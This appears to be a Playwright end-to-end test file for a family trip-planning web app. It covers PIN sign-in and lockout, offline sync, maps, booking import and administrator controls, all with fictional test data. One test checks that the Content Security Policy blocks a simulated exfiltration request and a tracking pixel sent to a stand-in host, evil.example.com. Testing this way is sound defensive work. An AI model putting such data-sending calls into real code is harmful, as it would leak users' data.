import { test, expect } from '@playwright/test';
import { stubNetwork } from './stubs.mjs';
import { TEST_USERS } from '../../dev/gas-fake.mjs';

// All data here is the fictional test trip and family from dev/gas-fake.mjs (Mar 4–27, 2030).
const API = 'http://localhost:8787';
const { admin, casey, blake } = TEST_USERS;

async function post(body) {
  const r = await fetch(API, { method: 'POST', headers: { 'Content-Type': 'text/plain' }, body: JSON.stringify(body) });
  return r.json();
}
async function signInApi(user, pin = user.pin) {
  return post({ action: 'login', email: user.email, pin });
}
let adminToken = null;
async function api(body) {
  return post({ token: adminToken, ...body });
}
async function sheetRows(tab) {
  return (await api({ action: 'read' })).data.tabs[tab].rows;
}
async function seed() {
  await fetch(`${API}/reset`, { method: 'POST' });
  adminToken = (await signInApi(admin)).token;
  const rows = [
    ['Transport', { ID: 'T-1', Date: '2030-03-08', Depart: '09:30', Arrive: '12:00', Mode: 'Limited express', From: 'Otaru', To: 'Hakodate', 'Carrier / train': 'Hokuto 5', Who: 'Everyone', Status: 'Confirmed' }],
    ['Reservations', { ID: 'R-1', Date: '2030-03-08', Time: '18:30', Type: 'Restaurant', Name: 'Seafood dinner', City: 'Hakodate', Who: 'Avery, Blake', Status: 'Tentative', 'Cancellation deadline': '2030-03-06 18:00' }],
    ['Reservations', { ID: 'R-old', Date: '2030-03-08', Time: '20:00', Type: 'Restaurant', Name: 'Old booking', City: 'Hakodate', Who: 'Everyone', Status: 'Cancelled' }],
    ['Notes', { ID: 'N-1', Date: '2030-03-08', City: 'Hakodate', Who: 'Everyone', Note: 'Morning market by the bay' }],
    ['Restaurant ideas', { ID: 'I-1', Name: 'Ramen alley', City: 'Sapporo', Cuisine: 'Ramen', 'Kid-friendly': 'Yes', Status: 'Idea' }],
    ['Restaurant ideas', { ID: 'I-2', Name: 'Kaiseki house', City: 'Sendai', Cuisine: 'Kaiseki', 'Kid-friendly': 'No', Status: 'Idea' }],
  ];
  for (const [tab, values] of rows) await api({ action: 'upsert', tab, values });
}

/** Opens the app as an already-connected phone, with the clock at `when` (Japan time). */
async function open(page, context, { hash = '#day', when = '2030-03-04T09:00:00+09:00', user = admin, stub = true } = {}) {
  if (stub) await stubNetwork(context);
  const r = await signInApi(user);
  const config = { url: API, token: r.token, me: r.me };
  await context.addInitScript((c) => { if (!sessionStorage.getItem('seeded')) { sessionStorage.setItem('seeded', '1'); if (!localStorage.getItem('trip.config.v1')) localStorage.setItem('trip.config.v1', JSON.stringify(c)); } }, config);
  // Playwright's fake clock also breaks service-worker cache reads, so offline tests use the real clock (when: null)
  if (when) {
    await page.clock.install({ time: new Date(when) });
    await page.clock.resume();
  }
  await page.goto(`/${hash}`);
  await expect(page.locator('.sync-pill')).toContainText('Synced', { timeout: 15000 });
}

async function deviceStorage(page) {
  return page.evaluate(() => new Promise((resolve) => {
    const req = indexedDB.open('keyval-store');
    req.onsuccess = () => {
      const db = req.result;
      if (!db.objectStoreNames.contains('keyval')) return resolve({ idb: 0, keys: [], config: localStorage.getItem('trip.config.v1') });
      const c = db.transaction('keyval', 'readonly').objectStore('keyval').getAllKeys();
      c.onsuccess = () => resolve({ idb: c.result.length, keys: c.result, config: localStorage.getItem('trip.config.v1') });
    };
  }));
}

test.beforeEach(async () => { await seed(); });

test('first sign-in: invite link, email and PIN, then a prompt to choose your own PIN', async ({ page, context }) => {
  await stubNetwork(context);
  await page.clock.install({ time: new Date('2030-01-15T12:00:00+09:00') });
  await page.clock.resume();
  await page.goto(`/#setup=${encodeURIComponent(API)}`);
  await expect(page.getByRole('heading', { name: 'Welcome' })).toBeVisible();
  await expect(page.locator('input[type=url]')).toHaveValue(API);
  await page.getByLabel('Email').fill(blake.email);
  await page.getByLabel('PIN', { exact: true }).fill('000111');
  await page.getByRole('button', { name: 'Sign in' }).click();
  await expect(page.getByText('That email and PIN don’t match')).toBeVisible();
  await page.getByLabel('PIN', { exact: true }).fill(blake.pin);
  await page.getByRole('button', { name: 'Sign in' }).click();
  // Before the trip, the Day view opens on the first trip day
  await expect(page.locator('.date-label')).toContainText('Mon, Mar 4');
  await expect(page.locator('.card h3').first()).toContainText('Sapporo');
  // First sign-in with a PIN the organizer chose: offered a new one
  const dlg = page.getByRole('dialog', { name: 'Choose your own PIN' });
  await expect(dlg).toBeVisible();
  await dlg.getByLabel(/^New PIN \(/).fill('123456');
  await dlg.getByLabel('New PIN again').fill('123456');
  await dlg.getByRole('button', { name: 'Save new PIN' }).click();
  await expect(dlg.getByText('Too easy to guess')).toBeVisible();
  await dlg.getByLabel(/^New PIN \(/).fill('580317');
  await dlg.getByLabel('New PIN again').fill('580317');
  await dlg.getByRole('button', { name: 'Save new PIN' }).click();
  await expect(dlg).toBeHidden();
  expect((await signInApi(blake)).error).toBe('bad_login');
  expect((await signInApi(blake, '580317')).ok).toBe(true);
  await page.goto('/#settings');
  await expect(page.locator('.kv').nth(1)).toContainText('Blake (blake@example.com)');
  await expect(page.locator('#admin-panel')).toHaveCount(0); // not the administrator
});

test('first sign-in: "Not now" keeps the given PIN, with a reminder in Settings', async ({ page, context }) => {
  await stubNetwork(context);
  await page.goto(`/#setup=${encodeURIComponent(API)}`);
  await page.getByLabel('Email').fill(blake.email);
  await page.getByLabel('PIN', { exact: true }).fill(blake.pin);
  await page.getByRole('button', { name: 'Sign in' }).click();
  await page.getByRole('dialog', { name: 'Choose your own PIN' }).getByRole('button', { name: 'Not now' }).click();
  await page.goto('/#settings');
  await expect(page.getByText('You are still using the PIN the trip organizer gave you')).toBeVisible();
});

test('five wrong PINs lock the account for 15 minutes', async ({ page, context }) => {
  await stubNetwork(context);
  await page.goto(`/#setup=${encodeURIComponent(API)}`);
  await page.getByLabel('Email').fill(casey.email);
  for (let i = 0; i < 5; i++) {
    await page.getByLabel('PIN', { exact: true }).fill('000111');
    await page.getByRole('button', { name: 'Sign in' }).click();
    await expect(page.getByRole('button', { name: 'Sign in' })).toBeEnabled();
  }
  await expect(page.getByText(/Too many wrong PINs\. Try again in 15 min/)).toBeVisible();
  expect((await signInApi(casey)).error).toBe('account_locked');
});

test('installed app (iPhone keeps separate storage): pasting the invite link connects', async ({ page, context }) => {
  await stubNetwork(context);
  await page.goto('/');
  await expect(page.getByRole('heading', { name: 'Welcome' })).toBeVisible();
  await page.locator('input[type=url]').fill(`https://example.github.io/trip/#setup=${encodeURIComponent(API)}`);
  await page.getByLabel('Email').fill(casey.email);
  await page.getByLabel('PIN', { exact: true }).fill(casey.pin);
  await page.getByRole('button', { name: 'Sign in' }).click();
  await expect(page.locator('.date-label')).toBeVisible();
  await expect(page.getByRole('dialog')).toHaveCount(0); // Casey already chose a PIN: no prompt
});

test('day view: groups, time order, cancelled hidden, weather labelled', async ({ page, context }) => {
  await open(page, context);
  await expect(page.locator('.date-label')).toContainText('Mon, Mar 4'); // today, during the trip
  await page.getByRole('button', { name: /Fri, Mar 8/ }).click();
  const card = page.locator('section.card').first();
  await expect(card.locator('h3')).toContainText('Hakodate');
  const titles = await card.locator('.timeline .ttl').allTextContents();
  expect(titles).toEqual(['Check out: Stay in Otaru', 'Limited express: Otaru → Hakodate', 'Seafood dinner', 'Morning market by the bay', 'Check in: Stay in Hakodate']);
  await expect(card).not.toContainText('Old booking');
  // Mar 8 is inside the 16-day forecast from Mar 4; Mar 23 is not
  await expect(card.locator('.wx').first()).toContainText('Forecast');
  await expect(card.locator('.wx').first()).toContainText('°F');
  await page.getByRole('button', { name: /Sat, Mar 23/ }).click();
  await expect(page.locator('section.card').first().locator('.wx').first()).toContainText('Typical');
});

test('issues: missing night, double booking and deadline in 72 h', async ({ page, context }) => {
  await api({ action: 'upsert', tab: 'Reservations', values: { ID: 'R-x', Date: '2030-03-08', Time: '11:00', Name: 'Glass workshop', City: 'Hakodate', Who: 'Frankie' } });
  await open(page, context, { hash: '#issues' });
  await expect(page.getByText('Night of Mon, Mar 11: no stay for Everyone.')).toBeVisible();
  await expect(page.getByText(/Frankie: “Limited express: Otaru → Hakodate” \(09:30–12:00\) overlaps “Glass workshop”/)).toBeVisible();
  await expect(page.getByText(/“Seafood dinner” \(Mar 8\): free cancellation ends Wed, Mar 6 18:00 JST, in 5[67] h/)).toBeVisible();
  await page.getByRole('button', { name: 'Go to Mon, Mar 11' }).click();
  await expect(page.locator('.date-label')).toContainText('Mon, Mar 11');
  await expect(page.getByText('Nowhere to sleep booked for tonight')).toBeVisible();
});

test('add a reservation: dropdowns from Lists; "Last edited by" is the signed-in person', async ({ page, context }) => {
  await open(page, context);
  await page.getByRole('button', { name: 'Add to the trip' }).click();
  await page.getByRole('button', { name: 'Reservation', exact: true }).click();
  const dlg = page.getByRole('dialog', { name: 'Add reservation' });
  await dlg.locator('input[name=Date]').fill('2030-03-06');
  await dlg.locator('input[name=Time]').fill('12:30');
  await expect(dlg.locator('select[name=Type] option')).toHaveText(['—', 'Restaurant', 'Activity', 'Tour', 'Onsen', 'Other']);
  await dlg.locator('select[name=Type]').selectOption('Activity');
  await dlg.locator('input[name=Name]').fill('Music box museum');
  await dlg.locator('select[name=City]').selectOption('Otaru');
  await dlg.getByRole('button', { name: 'Kit (7)', exact: true }).click(); // children show their age
  await dlg.getByRole('button', { name: 'Robin (3)', exact: true }).click();
  await dlg.getByRole('button', { name: 'Add', exact: true }).click();
  await expect(page.locator('.sync-pill')).toContainText('Synced');
  await expect.poll(async () => (await sheetRows('Reservations')).find((r) => r.Name === 'Music box museum')).toMatchObject({
    Date: '2030-03-06', Time: '12:30', Type: 'Activity', City: 'Otaru', Who: 'Kit, Robin', Status: 'Tentative', 'Last edited by': 'Avery', 'Party size': 2,
  });
});

test('required fields are checked before saving', async ({ page, context }) => {
  await open(page, context);
  await page.getByRole('button', { name: 'Add to the trip' }).click();
  await page.getByRole('button', { name: 'Stay', exact: true }).click();
  const dlg = page.getByRole('dialog', { name: 'Add stay' });
  await dlg.locator('input[name="Check-out"]').fill('2030-03-03');
  await dlg.getByRole('button', { name: 'Add', exact: true }).click();
  await expect(dlg.getByText('Must be after check-in')).toBeVisible();
  await expect(dlg.locator('[data-col=City] .err')).toHaveText('Required');
  await expect(dlg.locator('[data-col=Who] .err')).toHaveText('Pick who is going');
  // Notes don't need a Who
  await dlg.getByRole('button', { name: 'Close', exact: true }).last().click();
  await page.getByRole('button', { name: 'Add to the trip' }).click();
  await page.getByRole('button', { name: 'Note', exact: true }).click();
  const note = page.getByRole('dialog', { name: 'Add note' });
  await note.locator('textarea[name=Note]').fill('Bring adapters');
  await note.getByRole('button', { name: 'Add', exact: true }).click();
  await expect(note).toBeHidden();
});

test('edit a stay: paste a Google Maps link to fix the pin; only changed fields are sent', async ({ page, context }) => {
  await open(page, context);
  await page.getByRole('button', { name: /Fri, Mar 8/ }).click();
  await page.getByRole('button', { name: 'Edit Stay in Hakodate' }).click();
  const dlg = page.getByRole('dialog', { name: 'Edit stay' });
  await dlg.locator('input[name=Hotel]').fill('Harbor Inn');
  await dlg.getByPlaceholder(/Paste a Google Maps link/).fill('https://www.google.com/maps/place/Harbor/@41.7687,140.7288,17z');
  await dlg.getByRole('button', { name: 'Use' }).click();
  await expect(dlg.getByText('Pinned at 41.76870, 140.72880')).toBeVisible();
  await dlg.getByRole('button', { name: 'Save' }).click();
  await expect.poll(async () => (await sheetRows('Stays')).find((r) => r.City === 'Hakodate')).toMatchObject({ Hotel: 'Harbor Inn', Lat: 41.7687, Lng: 140.7288, 'Last edited by': 'Avery', Status: 'Tentative' });
});

test('filters: persist after reload and apply to the day view', async ({ page, context }) => {
  await open(page, context);
  await page.getByRole('button', { name: /^Filters/ }).click();
  const dlg = page.getByRole('dialog', { name: 'Filters' });
  await dlg.getByRole('group', { name: 'People' }).getByRole('button', { name: 'Kit', exact: true }).click();
  await dlg.getByRole('group', { name: 'Status' }).getByRole('button', { name: 'Cancelled' }).click();
  await dlg.getByRole('button', { name: 'Apply' }).click();
  await page.reload();
  await expect(page.getByRole('button', { name: 'Filters (2 on)' })).toBeVisible();
  await page.getByRole('button', { name: /Fri, Mar 8/ }).click();
  await expect(page.locator('section.card')).toHaveCount(1);
  await expect(page.locator('section.card')).toContainText('Old booking'); // Cancelled shown only because it was picked
  await expect(page.locator('section.card')).not.toContainText('Seafood dinner'); // Avery & Blake only
});

test('restaurant ideas: kid-friendly filter and one-tap move to Reservations', async ({ page, context }) => {
  await open(page, context, { hash: '#ideas' });
  await expect(page.locator('.card h3')).toHaveText(['Ramen alley', 'Kaiseki house']);
  await page.getByRole('button', { name: 'Kid-friendly only' }).click();
  await expect(page.locator('.card h3')).toHaveText(['Ramen alley']);
  await page.getByRole('button', { name: 'Move to Reservations' }).click();
  const dlg = page.getByRole('dialog', { name: 'Move to Reservations' });
  await dlg.locator('input[name=Date]').fill('2030-03-04');
  await dlg.locator('input[name=Time]').fill('12:00');
  await dlg.getByRole('button', { name: 'Move to Reservations' }).click();
  await expect.poll(async () => (await sheetRows('Reservations')).find((r) => r.Name === 'Ramen alley')).toMatchObject({ Date: '2030-03-04', Time: '12:00', City: 'Sapporo', 'Kid-friendly': 'Yes', Type: 'Restaurant', Who: 'Everyone' });
  await expect.poll(async () => (await sheetRows('Restaurant ideas')).find((r) => r.ID === 'I-1')?.Status).toBe('Confirmed');
});

test('map: pins for the chosen day link to Google Maps and Apple Maps', async ({ page, context }) => {
  await open(page, context);
  await page.getByRole('button', { name: /Fri, Mar 8/ }).click();
  await page.locator('nav a[href="#map"]:visible').click();
  await expect(page.locator('.map-controls')).toContainText('Fri, Mar 8');
  await expect(page.locator('.map-note')).toContainText('Hakodate: everyone');
  const pin = page.getByRole('button', { name: 'Seafood dinner' });
  await expect(pin).toBeVisible();
  await pin.click();
  const popup = page.locator('.maplibregl-popup');
  await expect(popup).toContainText('Seafood dinner');
  await expect(popup.getByRole('link', { name: /Google Maps/ })).toHaveAttribute('href', /^https:\/\/www\.google\.com\/maps\/search\/\?api=1&query=/);
  await expect(popup.getByRole('link', { name: /Apple Maps/ })).toHaveAttribute('href', /^https:\/\/maps\.apple\.com\/\?/);
});

test('offline: app and data load without a connection, edits queue and sync later', async ({ page, context }) => {
  await open(page, context, { when: null }); // real clock: before the trip, so the app opens on its first day
  await page.evaluate(async () => { await navigator.serviceWorker.ready; });
  await page.reload();
  await expect.poll(() => page.evaluate(() => !!navigator.serviceWorker.controller)).toBe(true);
  await expect(page.locator('.sync-pill')).toContainText('Synced');
  await expect(page.locator('.wx').first()).toContainText('°F'); // weather downloaded before going offline

  await context.setOffline(true);
  await page.reload();
  await expect(page.locator('.sync-pill')).toContainText('Offline');
  await page.getByRole('button', { name: /Fri, Mar 8/ }).click();
  await expect(page.getByText('Seafood dinner', { exact: true })).toBeVisible(); // data from the device
  await expect(page.locator('.wx').first()).toContainText('°F'); // weather from the device

  await page.getByRole('button', { name: 'Add to the trip' }).click();
  await page.getByRole('button', { name: 'Note', exact: true }).click();
  const dlg = page.getByRole('dialog', { name: 'Add note' });
  await dlg.locator('textarea[name=Note]').fill('Buy Robin a rain poncho');
  await dlg.getByRole('button', { name: 'Add', exact: true }).click();
  await expect(page.locator('.sync-pill')).toContainText('1 waiting');
  await expect(page.getByText('Not synced yet')).toBeVisible();
  expect((await sheetRows('Notes')).length).toBe(1);

  await context.setOffline(false);
  await expect(page.locator('.sync-pill')).toContainText('Synced', { timeout: 15000 });
  await expect(page.locator('.sync-pill')).not.toContainText('waiting');
  await expect.poll(async () => (await sheetRows('Notes')).map((r) => r.Note)).toContain('Buy Robin a rain poncho');
});

test('map files are cached only as they are viewed, and reused offline', async ({ page, context }) => {
  await open(page, context, { when: null });
  await page.evaluate(async () => { await navigator.serviceWorker.ready; });
  await page.reload();
  await expect.poll(() => page.evaluate(() => !!navigator.serviceWorker.controller)).toBe(true);
  const cached = () => page.evaluate(async () => ((await caches.has('map-tiles')) ? (await (await caches.open('map-tiles')).keys()).map((r) => r.url) : []));
  expect(await cached()).toEqual([]); // nothing fetched ahead of time
  await page.goto('/#map');
  await expect.poll(cached).toContain('https://tiles.openfreemap.org/styles/liberty');
  await context.setOffline(true);
  await page.reload();
  await expect(page.locator('.pin').first()).toBeVisible(); // pins are drawn only after the style loads, here from the cache
  await expect(page.locator('.map-note')).not.toContainText('could not start');
});

test('removing a person’s access erases the trip from their phone at the next sync', async ({ page, context }) => {
  await open(page, context, { user: casey });
  await expect(page.locator('section.card').first()).toBeVisible();
  expect((await deviceStorage(page)).idb).toBeGreaterThan(0);
  await fetch(`${API}/revoke?email=${casey.email}`, { method: 'POST' });
  await page.locator('.sync-pill').click();
  await expect(page.getByRole('heading', { name: 'Welcome' })).toBeVisible();
  await expect(page.getByText('this device’s copy of the trip was erased')).toBeVisible();
  const after = await deviceStorage(page);
  expect(after.idb).toBe(0);
  expect(JSON.parse(after.config)).toEqual({ url: API }); // sign-in gone; the link stays so they can sign in again
  await expect(page.locator('body')).not.toContainText('Sapporo');
});

test('sign out ends the session and erases the trip and saved map areas from the device', async ({ page, context }) => {
  await open(page, context, { hash: '#settings', user: casey });
  const token = await page.evaluate(() => JSON.parse(localStorage.getItem('trip.config.v1')).token);
  await expect(page.locator('.kv').nth(1)).toContainText('Casey (casey@example.com)');
  page.once('dialog', (d) => d.accept());
  await page.getByRole('button', { name: 'Sign out and erase this device' }).click();
  await expect(page.getByRole('heading', { name: 'Welcome' })).toBeVisible();
  const after = await deviceStorage(page);
  expect(after.keys).toEqual([]);
  expect(after.config).toBe(null);
  expect(await page.evaluate(() => caches.has('map-tiles'))).toBe(false);
  expect((await post({ action: 'read', token })).error).toBe('bad_session'); // the server forgot this device too
});

test('administrator: add a person, who then signs in with the starting PIN', async ({ page, context, browser }) => {
  await open(page, context, { hash: '#settings' });
  const panel = page.locator('#admin-panel');
  await expect(panel).toContainText('Avery · administrator');
  await expect(panel).toContainText('casey@example.com');
  await expect(panel).toContainText('Has not chosen own PIN yet'); // Blake
  await panel.getByRole('button', { name: 'Add a person' }).click();
  const dlg = page.getByRole('dialog', { name: 'Add a person' });
  await dlg.getByRole('combobox').selectOption('Emery');
  await dlg.getByLabel('Email').fill('Emery@Example.com');
  await dlg.getByLabel(/Starting PIN/).fill('502817');
  await dlg.getByRole('button', { name: 'Add', exact: true }).click();
  const done = page.getByRole('dialog', { name: 'Emery can now sign in' });
  await expect(done).toContainText('502817');
  await expect(done).toContainText('emery@example.com');
  await expect(done).toContainText(`#setup=${encodeURIComponent(API)}`);
  await done.getByRole('button', { name: 'Close', exact: true }).last().click();
  await expect(panel).toContainText('emery@example.com');
  const r = await post({ action: 'login', email: 'emery@example.com', pin: '502817' });
  expect(r.me).toMatchObject({ name: 'Emery', role: 'member', mustChangePin: true });

  // Reset Casey's PIN: Casey is signed out everywhere
  const caseyToken = (await signInApi(casey)).token;
  await panel.locator('.item-row', { hasText: 'casey@example.com' }).getByRole('button', { name: 'Reset PIN' }).click();
  const reset = page.getByRole('dialog', { name: "Reset Casey's PIN" });
  await reset.getByLabel('New starting PIN').fill('640213');
  await reset.getByRole('button', { name: 'Reset PIN' }).click();
  await expect(page.getByRole('dialog', { name: 'Casey can now sign in' })).toContainText('640213');
  expect((await post({ action: 'read', token: caseyToken })).error).toBe('bad_session');

  // Remove Blake
  await page.getByRole('dialog', { name: 'Casey can now sign in' }).getByRole('button', { name: 'Close', exact: true }).last().click();
  page.once('dialog', (d) => d.accept());
  await panel.locator('.item-row', { hasText: 'blake@example.com' }).getByRole('button', { name: 'Remove access' }).click();
  await expect(panel).not.toContainText('blake@example.com');
  expect((await signInApi(blake)).error).toBe('bad_login');
});

test('security policy: the app cannot send data to other sites', async ({ page, context }) => {
  const violations = [];
  page.on('console', (m) => { if (/Content Security Policy/i.test(m.text())) violations.push(m.text()); });
  await open(page, context);
  await page.locator('nav a[href="#map"]:visible').click();
  await expect(page.locator('.pin').first()).toBeVisible();
  expect(violations).toEqual([]); // normal use stays within the policy
  const result = await page.evaluate(async () => { try { await fetch('https://evil.example.com/collect', { method: 'POST', body: 'x' }); return 'sent'; } catch { return 'blocked'; } });
  expect(result).toBe('blocked');
  const img = await page.evaluate(() => new Promise((r) => { const i = new Image(); i.onload = () => r('loaded'); i.onerror = () => r('blocked'); i.src = 'https://evil.example.com/pixel.png'; }));
  expect(img).toBe('blocked');
});

test('families: households in Settings, Who chips, party summary, and child checks', async ({ page, context }) => {
  await open(page, context, { hash: '#settings' });
  const fam = page.locator('#families');
  await expect(fam).toContainText('Avery family');
  await expect(fam).toContainText('2 adults, 2 children (7, 3)');
  await expect(fam).toContainText('Children: Kit (7), Robin (3)');
  await expect(fam).toContainText('Not in a household:');

  // Put Gale in the Casey and Drew household from the app
  await fam.getByRole('button', { name: 'Edit Gale' }).click();
  const person = page.getByRole('dialog', { name: 'Edit person' });
  await person.getByRole('group', { name: 'Household' }).getByRole('combobox').selectOption('Casey and Drew');
  await person.getByRole('button', { name: 'Save' }).click();
  await expect.poll(async () => (await sheetRows('People')).find((r) => r.Name === 'Gale').Household).toBe('Casey and Drew');

  // Booking for a household: chip selects parents and children; party size fills itself in
  await page.locator('nav a[href="#day"]:visible').click();
  await page.getByRole('button', { name: 'Add to the trip' }).click();
  await page.getByRole('button', { name: 'Reservation', exact: true }).click();
  const dlg = page.getByRole('dialog', { name: 'Add reservation' });
  await dlg.locator('input[name=Date]').fill('2030-03-06');
  await dlg.locator('input[name=Time]').fill('10:00');
  await dlg.locator('input[name=Name]').fill('Kids museum');
  await dlg.getByRole('group', { name: 'Groups and families' }).getByRole('button', { name: 'Avery family' }).click();
  await expect(dlg.getByText('2 adults, 2 children (7, 3)')).toBeVisible();
  await dlg.getByRole('button', { name: 'Add', exact: true }).click();
  await expect.poll(async () => (await sheetRows('Reservations')).find((r) => r.Name === 'Kids museum')).toMatchObject({ Who: 'Avery family', 'Party size': 4 });

  // A child booked with no adult is flagged
  await api({ action: 'upsert', tab: 'Reservations', values: { ID: 'R-kids', Date: '2030-03-06', Time: '15:00', Name: 'Kids club', City: 'Otaru', Who: 'Kit, Robin' } });
  await page.goto('/#issues');
  await page.locator('.sync-pill').click();
  await expect(page.getByText('“Kids club” (Mar 6) has Kit, Robin but no adult.')).toBeVisible();
});

async function openImport(page) {
  await page.getByRole('button', { name: 'Add to the trip' }).click();
  await page.getByRole('button', { name: 'Import from a file or pasted text' }).click();
  return page.getByRole('dialog', { name: 'Import a booking' });
}

test('import pasted text: each booking opens pre-filled, and Who must be chosen', async ({ page, context }) => {
  await open(page, context);
  const dlg = await openImport(page);
  await dlg.locator('textarea[name=import-text]').fill('Your stay at Harbor View Hotel, Otaru, Mar 5-8. Flight AX123 Haneda to Sapporo.');
  await dlg.getByRole('button', { name: 'Read it' }).click();
  const found = page.getByRole('dialog', { name: 'Bookings found' });
  await expect(found).toContainText('Found 2 bookings');
  await expect(found).toContainText('Double-check: Check the flight time zone.');
  await expect(found).toContainText('Stay: Harbor View Hotel · Otaru · 2030-03-05 → 2030-03-08');
  await expect(found).toContainText('Names in the booking not matched to People: Pat Stranger');

  // The stay: pre-filled, guests matched to People
  await found.locator('[data-import-tab=Stays]').getByRole('button', { name: 'Check and add' }).click();
  const stay = page.getByRole('dialog', { name: 'Add stay' });
  await expect(stay).toContainText('Filled in by Claude');
  await expect(stay.locator('input[name=Hotel]')).toHaveValue('Harbor View Hotel');
  await expect(stay.locator('input[name="Check-out"]')).toHaveValue('2030-03-08');
  await expect(stay.locator('select[name=Status]')).toHaveValue('Confirmed');
  await expect(stay.getByRole('button', { name: 'Kit (7)', exact: true })).toHaveAttribute('aria-pressed', 'true');
  await stay.getByRole('button', { name: 'Add', exact: true }).click();
  await expect(found.locator('[data-import-tab=Stays]')).toContainText('✓ Added');

  // The flight: clear Who to show it is required, then choose
  await found.locator('[data-import-tab=Transport]').getByRole('button', { name: 'Check and add' }).click();
  const tr = page.getByRole('dialog', { name: 'Add transport' });
  await expect(tr.locator('select[name=Mode]')).toHaveValue('Flight');
  await tr.getByRole('button', { name: 'Casey', exact: true }).click();
  await tr.getByRole('button', { name: 'Drew', exact: true }).click();
  await tr.getByRole('button', { name: 'Add', exact: true }).click();
  await expect(tr.locator('[data-col=Who] .err')).toHaveText('Pick who is going');
  await tr.getByRole('group', { name: 'Groups and families' }).getByRole('button', { name: 'Casey and Drew' }).click();
  await tr.getByRole('button', { name: 'Add', exact: true }).click();
  await expect(found.locator('[data-import-tab=Transport]')).toContainText('✓ Added');
  await found.getByRole('button', { name: 'Done' }).click();

  await expect.poll(async () => (await sheetRows('Stays')).find((r) => r.Hotel === 'Harbor View Hotel')).toMatchObject({
    'Check-in': '2030-03-05', 'Check-out': '2030-03-08', City: 'Otaru', Who: 'Avery, Kit', 'Confirmation #': 'HV-0042', Status: 'Confirmed', 'Last edited by': 'Avery', Attachment: '',
  });
  await expect.poll(async () => (await sheetRows('Transport')).find((r) => r['Carrier / train'] === 'Air Example 123')).toMatchObject({
    Date: '2030-03-04', Depart: '09:10', Mode: 'Flight', From: 'Haneda Airport', To: 'Sapporo', Who: 'Casey, Drew',
  });
});

test('import a PDF: the file is kept with the booking and opens from the day view', async ({ page, context }) => {
  await open(page, context);
  const dlg = await openImport(page);
  await dlg.locator('input[type=file]').setInputFiles({ name: 'hotel.pdf', mimeType: 'application/pdf', buffer: Buffer.from('%PDF-1.4 fictional booking') });
  await expect(dlg).toContainText('hotel.pdf');
  await expect(dlg.getByRole('checkbox')).toBeChecked();
  await dlg.getByRole('button', { name: 'Read it' }).click();
  const found = page.getByRole('dialog', { name: 'Bookings found' });
  await expect(found).toContainText('The file is kept with each booking you add from here.');
  await found.locator('[data-import-tab=Stays]').getByRole('button', { name: 'Check and add' }).click();
  const stay = page.getByRole('dialog', { name: 'Add stay' });
  await expect(stay.getByRole('button', { name: 'View the uploaded file' })).toBeVisible();
  await stay.getByRole('button', { name: 'Add', exact: true }).click();
  await found.getByRole('button', { name: 'Done' }).click();
  await expect.poll(async () => (await sheetRows('Stays')).find((r) => r.Hotel === 'Harbor View Hotel')?.Attachment).toMatch(/^https:\/\/drive\.google\.com\/file\/d\//);
  const uploads = await (await fetch(`${API}/uploads`)).json();
  expect(uploads.find((f) => /hotel\.pdf$/.test(f.name))).toMatchObject({ mimeType: 'application/pdf', trashed: false });

  await expect(page.locator('.sync-pill')).toContainText('Synced');
  await page.getByRole('button', { name: /Mar 5(?!\d)/ }).first().click();
  await page.getByRole('button', { name: 'File', exact: true }).first().click();
  const view = page.getByRole('dialog', { name: 'Uploaded file' });
  await expect(view).toContainText('hotel.pdf');
  await expect(view.getByRole('link', { name: 'Open or save the file' })).toHaveAttribute('href', /^blob:/);
});

test('import: a kept file is discarded when nothing is added from it', async ({ page, context }) => {
  await open(page, context);
  const dlg = await openImport(page);
  await dlg.locator('input[type=file]').setInputFiles({ name: 'tickets.pdf', mimeType: 'application/pdf', buffer: Buffer.from('%PDF-1.4 tickets') });
  await dlg.getByRole('button', { name: 'Read it' }).click();
  await page.getByRole('dialog', { name: 'Bookings found' }).getByRole('button', { name: 'Done' }).click();
  await expect.poll(async () => (await (await fetch(`${API}/uploads`)).json()).find((f) => /tickets\.pdf$/.test(f.name))?.trashed).toBe(true);
});

test('import: clear messages when reading is off, or nothing is found', async ({ page, context }) => {
  await open(page, context);
  await fetch(`${API}/claude-off`, { method: 'POST' });
  let dlg = await openImport(page);
  await dlg.locator('textarea[name=import-text]').fill('Dinner at 7');
  await dlg.getByRole('button', { name: 'Read it' }).click();
  await expect(page.getByRole('status')).toContainText('Reading bookings is not turned on yet');
  await expect(dlg.getByRole('button', { name: 'Read it' })).toBeEnabled();
  await dlg.getByRole('button', { name: 'Close', exact: true }).last().click();

  await fetch(`${API}/claude-on`, { method: 'POST' });
  dlg = await openImport(page);
  await dlg.locator('textarea[name=import-text]').fill('NOTHING here');
  await dlg.getByRole('button', { name: 'Read it' }).click();
  await expect(page.getByRole('dialog', { name: 'Bookings found' })).toContainText('No bookings were found');
});

test('a change made directly in the Sheet shows up after sync', async ({ page, context }) => {
  await open(page, context);
  await api({ action: 'upsert', tab: 'Notes', values: { ID: 'N-sheet', Date: '2030-03-04', City: 'Sapporo', Who: 'Everyone', Note: 'Typed in the Sheet' } });
  await page.locator('.sync-pill').click();
  await expect(page.getByText('Typed in the Sheet')).toBeVisible();
});

test('desktop: map and day view side by side', async ({ page, context }, info) => {
  test.skip(info.project.name !== 'desktop', 'desktop layout only');
  await open(page, context);
  await expect(page.locator('.pane-main')).toBeVisible();
  await expect(page.locator('#map')).toBeVisible();
  const a = await page.locator('.pane-main').boundingBox();
  const b = await page.locator('.pane-map').boundingBox();
  expect(b.x).toBeGreaterThan(a.x + a.width - 2);
});

test('installable: manifest, icons and service worker are served', async ({ page, context, request }) => {
  await open(page, context);
  const manifest = await (await request.get('/manifest.webmanifest')).json();
  expect(manifest.display).toBe('standalone');
  expect(manifest.icons.map((i) => i.sizes)).toEqual(expect.arrayContaining(['192x192', '512x512']));
  for (const i of manifest.icons) expect((await request.get(`/${i.src}`)).ok()).toBe(true);
  expect((await request.get('/icons/apple-touch-icon.png')).ok()).toBe(true);
  await expect(page.locator('link[rel=apple-touch-icon]')).toHaveCount(1);
  expect(await page.evaluate(async () => (await navigator.serviceWorker.ready).active?.scriptURL)).toMatch(/sw\.js$/);
});
